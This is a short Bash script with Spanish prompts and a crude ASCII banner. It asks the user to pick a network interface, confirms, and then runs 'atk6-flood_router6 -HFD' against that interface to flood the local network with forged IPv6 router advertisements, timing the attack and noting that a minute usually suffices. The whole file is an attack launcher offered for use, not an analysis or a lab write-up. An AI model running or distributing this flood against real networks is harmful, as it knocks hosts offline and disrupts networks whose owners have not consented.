#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

clear

echo -e "${redColour} ________________          ______    _______         _______ _       _______ _______   ${endColour}"
echo -e "${redColour} _\__   __(  ____ )\     /|/ ____ \  (  ____ \\     /(  ____ \ \    /(  ____ (  ____ ) ${endColour}"
echo -e "${redColour} _   ) (  | (    )| )   ( ( (    \/  | (    \/ )   ( | (    \/  \  / / (    \/ (    )| ${endColour}"
echo -e "${redColour} _   | |  | (____)| |   | | (____    | (__   | |   | | |     |  (_/ /| (__   | (____)| ${endColour}"
echo -e "${redColour} _   | |  |  _____| (   ) )  ___ \   |  __)  | |   | | |     |   _ ( |  __)  |     __) ${endColour}"
echo -e "${redColour} _   | |  | (      \ \_/ /| (   ) )  | (     | |   | | |     |  ( \ \| (     | (\ (    ${endColour}"
echo -e "${redColour} ____) (__| )       \   / ( (___) )  | )     | (___) | (____/\  /  \ \ (____/\ ) \ \__ ${endColour}"
echo -e "${redColour} _\_______//         \_/   \_____/   |/      (_______|_______/_/    \(_______//   \__/ ${endColour}"
echo -e "${redColour} _                                                                                     ${endColour}"
echo -e "${yellowColour}Utiliza este script con cuidado...\n ${endColour}" && sleep 4
echo -e " "
echo -e "Por elkoyote07"

temporizador(){
time=0

function increment()
{
	let time+=1
}

tput civis && while true; do
	clear && echo -ne "${blueColour}Han pasado${endColour} ${greenColour}$time${endColour} ${blueColour}segundos.${blueColour}" && sleep 1
	increment
done && tput cnorm
}



echo -e "${purpleColour}\nElige una interfaz de red${endColour} ${blueColour}($(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' ','))${endColour}${purpleColour}:${endColour} " && tput cnorm
read interfaz

clear

echo -ne "${redColour}Iniciar ataque -> (s/n): ${endColour}" && tput cnorm
read respuesta

	if [ "$respuesta" == "s" ]; then
		clear && sleep 1

		echo -e "${redColour}Lanzando ataque...${endColour}"
		sleep 0.5
		echo -e "${purpleColour}\nCTRL+C para parar el ataque.${endColour}"
		sleep 0.5
		echo -e "${redColour}\nCon 1 minuto, normalmente, es suficiente.${endColour}"
		sleep 3

		atk6-flood_router6 -HFD $interfaz &>/dev/null | temporizador

	else
		echo -e "${greenColour}Saliendo...${endColour}"
		sleep 2
		clear && exit
	fi